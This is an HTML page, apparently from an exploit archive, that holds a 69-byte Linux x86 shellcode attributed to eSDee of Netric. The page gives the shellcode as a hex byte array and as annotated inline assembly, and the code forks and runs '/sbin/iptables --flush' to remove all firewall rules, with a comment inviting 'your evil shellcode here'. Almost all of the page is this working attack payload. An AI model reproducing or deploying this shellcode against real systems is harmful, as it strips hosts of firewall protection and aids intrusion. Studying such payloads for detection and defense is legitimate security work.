<html><head><title>Linux/x86 - /sbin/iptables --flush - 69 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/* linux x86 shellcode by eSDee of Netric (www.netric.org)
 * /sbin/iptables --flush
 */

char
main[] =
        &quot;\x31\xc0\x31\xdb\xb0\x02\xcd\x80&quot;
        &quot;\x39\xd8\x75\x2d\x31\xc0\x50\x66&quot;
        &quot;\x68\x2d\x46\x89\xe6\x50\x68\x62&quot;
        &quot;\x6c\x65\x73\x68\x69\x70\x74\x61&quot;
        &quot;\x68\x62\x69\x6e\x2f\x68\x2f\x2f&quot;
        &quot;\x2f\x73\x89\xe3\x8d\x54\x24\x10&quot;
        &quot;\x50\x56\x54\x89\xe1\xb0\x0b\xcd&quot;
        &quot;\x80\x89\xc3\x31\xc0\x31\xc9\x31&quot;
        &quot;\xd2\xb0\x07\xcd\x80&quot;; 

        /* your evil shellcode here */

int 
asm_code()
{
        __asm(&quot;
                xorl %eax,%eax
                xorl %ebx,%ebx
                movb $2, %al
                int $0x080
                cmpl %ebx,%eax
                jne WAIT

                xorl  %eax,%eax
                pushl %eax
                pushw $0x462d
                movl %esp,%esi
                pushl %eax
                pushl $0x73656c62
                pushl $0x61747069
                pushl $0x2f6e6962
                pushl $0x732f2f2f
                movl   %esp,%ebx
                leal   0x10(%esp),%edx
                pushl  %eax
                pushl  %esi
                pushl  %esp
                movl   %esp,%ecx
                movb   $0xb,%al
                int    $0x80

                WAIT:
                movl %eax, %ebx
                xorl %eax, %eax
                xorl %ecx, %ecx
                xorl %edx, %edx
                movb $7, %al
                int $0x80
                &quot;);

}


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
